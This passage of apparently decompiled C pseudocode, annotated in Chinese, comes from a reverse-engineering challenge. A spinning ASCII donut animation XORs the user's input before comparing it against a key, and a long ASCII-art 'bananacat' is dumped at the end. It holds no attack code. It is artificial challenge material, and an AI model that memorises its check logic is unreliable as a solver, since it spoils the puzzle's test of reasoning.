12.0); v24 = 80 * v25 + v26; v23 = (8.0 * ((((((v34 * v35) - ((v37 * v36) * v33)) * v29) - ((v37 * v36) * v35)) - (v34 * v33)) - ((v30 * v36) * v28))); if ( v25 &lt;= 21 &amp;&amp; v25 > 0 &amp;&amp; v26 > 0 &amp;&amp; v26 &lt;= 79 &amp;&amp; v31 > v20[v24] ) { v20[v24] = v31; v11 = v23; if ( v23 &lt; 0 ) v11 = 0; s[v24] = special_char[v11]; // special_char就是印出甜甜圈的素材 } if ( v40 == 30 &amp;&amp; v42 &lt;= 0x3FF ) { v22 = v24 ^ v23 ^ (v26 + v25); v12 = v42++; *(user_input + v12) ^= v24 ^ v23 ^ (v26 + v25); } ++v40; v13 = k + 0.02; } v14 = j + 0.07000000000000001; } printf("\x1B[H"); // 這個代表游標回到home position for ( idx = 0; idx &lt;= 0x6E0; ++idx ) // 這一段for loop就是在印出甜甜圈 { if ( idx % 80 ) v15 = s[idx]; else v15 = 10; putchar(v15); v16 = v47 + 0.00004; v47 = v16; v17 = v46 + 0.00002; v46 = v17; } usleep(30000u); // 睡眠0.03秒 } cipher_1 = verification(user_input, 0x400uLL); cipher_2 = verification(key, 0x400uLL); if ( cipher_1 == cipher_2 ) puts("Donut likes your input!! :D"); else puts("Donut Reject You!! :("); puts("No matter donut accept you or not. Here's a bananacat for you"); puts(icon); puts(&amp;icon[112]); puts(&amp;icon[232]); puts(&amp;icon[352]); puts(&amp;icon[480]); puts(&amp;icon[600]); puts(&amp;icon[728]); puts(&amp;icon[856]); puts(&amp;icon[992]); puts(&amp;icon[1128]); puts(&amp;icon[1272]); puts(" ░ ░▓▒▒▒▒▒░░░░░░░░░░▒▒▒▓▒░░ \x00\x00 ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \x00\x00\x00\x00\x00\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▒▒▒▒▒▒░░░░░░░░░░░▒▒▒▓▓▒░ \x00\x00\x00\x00\x00\x00 ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░ ░▒▓▒▒▒▒▒▒▒▒░░░░░░░░░▒▒▒▒▓░ \x00\x00\x00\x00\x00\x00 ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▒▓▒▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▒▓▓░ \x00\x00\x00\x00 ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▒▒▒▓▓▓▓▓▓▒▒▒▒▒▒░▒▒▒▒▒▒▓░ ░ \x00\x00 ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░▒▓▓▓▒▓▒▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▒▒▓▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ \x00\x00\x00\x00 ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ \x00\x00\x00\x00\x00\x00 ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ \x00\x00\x00\x00\x00\x00 ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ \x00\x00 ░░▓██████▓▒▒▓▓▒▒▒▒▒░ \x00\x00\x00\x00 ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ \x00\x00 ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░░░░░░░░ \x00\x00 ░░ "); puts(" ░░▒▓▒▒▓▓▓▒▒▒▒▒▓▓▓▓▓▓▓▒▒▒▒▒▒▓▓░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▒▓▓▒▒▓▓▓▒▒▒▓▓▓▓▓▓▓▓▓▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ \x00\x00 ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ \x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ \x00\x00\x00\x00\x00\x00\x00\x00 ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ \x00\x00\x00\x00\x00\x00 ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ \x00\x00\x00\x00\x00\x00\x00\x00 ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ \x00\x00\x00\x00 ░ 